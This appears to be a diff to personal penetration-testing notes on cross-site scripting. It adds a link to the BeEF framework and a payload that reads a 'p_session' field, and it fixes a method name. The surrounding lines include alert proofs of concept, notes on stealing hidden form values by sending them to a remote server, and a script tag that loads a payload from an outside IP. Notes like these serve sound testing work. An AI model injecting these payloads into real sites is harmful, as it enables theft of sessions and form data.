@@ -16,6 +16,8 @@ ___
 ## Description:  
 https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
 
+[beEF](https://github.com/beefproject/beef)
+
 ### Good test payloads
 ```
 <script>alert(1)</script>
@@ -84,12 +86,14 @@ file_put_contents($logFile, $logData, FILE_APPEND);
 
 ### Steal the value of hidden input fields on a page
 
+Using BEEF can be an easier way to steal HTML pages and Form Values if you are having trouble with the below
+
 Let's say the target web page contains a hidden input field with an id of "secret":
 ```
 <input type="hidden" id="secret" value="sensitive_value">
 ```
 
-You can also change this from getElementById to getElementById if its using name instead of id.
+You can also change this from getElementById to getElementsByName if its using name instead of id.
 
 An attacker can inject a malicious script that retrieves the value of the hidden input field and sends it to a remote server.
 
@@ -113,7 +117,10 @@ Simple alert box POC:
 ```
 <script>alert(document.getElementById('html_input_field').value);</script>
 ```
-
+Using name instead of id:
+```
+<script>var p_session = document.getElementsByName("p_session")[0].value; alert("p_session value: " + p_session);</script>
+```
 ### Downloader for longer XSS payloads
 ```
 <script src=http://10.10.14.23:80/payload.js>
